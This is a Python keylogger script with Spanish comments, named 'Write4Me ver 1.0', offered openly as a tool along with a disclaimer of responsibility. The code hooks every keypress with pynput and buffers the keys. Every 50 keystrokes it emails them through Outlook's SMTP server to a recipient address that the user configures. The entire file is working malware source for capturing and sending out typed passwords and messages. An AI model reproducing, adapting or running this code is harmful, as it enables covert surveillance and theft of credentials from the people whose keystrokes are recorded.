#Write4Me ver 1.0

# Este keylogger ha sido creado a partir de tutoriales de Python, búsquedas en internet y la documentación de Python.
#NO ME HAGO RESPONSABLE DE LO QUE HAGÁIS CON EL CÓDIGO. LOS ACTOS QUE HAGÁIS CON EL NO SERÁN RESPONSABILIDAD MÍA. 

# Primero importamos Librerías 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
from pynput.keyboard import Key, Listener


#Empezamos con el keylogger

email_address = "CORREO-ORIGEN" #Aquí tienes que escribir la dirección del correo electrónico origen (Correo predeterminado: OutLook)
password = "CONTRASEÑA" #Aquí tienes que escribir la contraseña de tu correo
toaddr = "CORREO-DESTINATARIO" #Aquí tienes que escribir la dirección del correo electrónico destinatario (puede ser el mismo que el de origen)

def enviar_correo(toaddr): #Esta función enviará el bloc de notas a tu correo electrónico a través de su servidor SMTP

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr #Correo electrónico origen

    msg['To'] = toaddr #Correo electrónico destinatario

    msg['Subject'] = "KEYLOGGER" #Asunto (puedes cambiar el nombre del asunto si quieres) 

    body = bodytext #Aquí iran las teclas registradas

    msg.attach(MIMEText(body, 'plain')) 

    s = smtplib.SMTP('smtp-mail.outlook.com', 587) #Aquí pondremos el servidor smtp y el puerto que queramos, en mi caso he puesto OutLook

    s.starttls()

    s.login(fromaddr, password) #Iniciamos sesión con nuestra cuenta con las variables ya establecidas (correo y contraseña)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text) #Ejecuta el envío del correo

    s.quit() #Cierra la conexión

recuento = 0
recuento_maximo_envio = 50 #Esta variable establece el límite de teclas que se pueden pulsar antes de que envíe el registro. Se puede modificar a tu gusto (max 50)
letras = [] #Esta variable se usará para guardar temporalmente las teclas que se vayan pulsando
bodytext = "" # Esta variable será el cuerpo del correo electrónico


def on_press(key): #Este evento se ejecutará cada vez que pulsemos una tecla
    global recuento, letras, bodytext #Esto hará que las variables puedan ser leidas en cualquier punto del programa 

    print(key)
    recuento += 1 # Añade una key más al recuento de keys
    letras.append(key)
    if recuento >= recuento_maximo_envio: #Esto sirve para que al llegar al recuento máximo de palabras el programa envie el archivo por correo electrónico (Predeterminado: OutLook).
        bodytext = str(letras)
        enviar_correo(toaddr) #Esto hará que el programa envíe el registro de teclas a tu correo electrónico (llama a la función de enviar correo)
        recuento = 0 # Al terminar el envío del correo, el recuento se restablece a 0
        letras = [] # Esto borra las teclas guardadas hasta ahora ya que ya se han enviado
        bodytext = "" #Esto restablece la variable del cuerpo del correo

def on_release(key): #Evento que se ejecuta una vez sueltas la tecla (En mi caso cierra el programa)
    if key == Key.esc:
        return False #Si el programa encuentra una tecla "esc", se va a cerrar el keylogger

with Listener(on_press=on_press, on_release= on_release) as listener: #Esto escucha las teclas que pulsamos y va ejecutando las funciones.
    listener.join()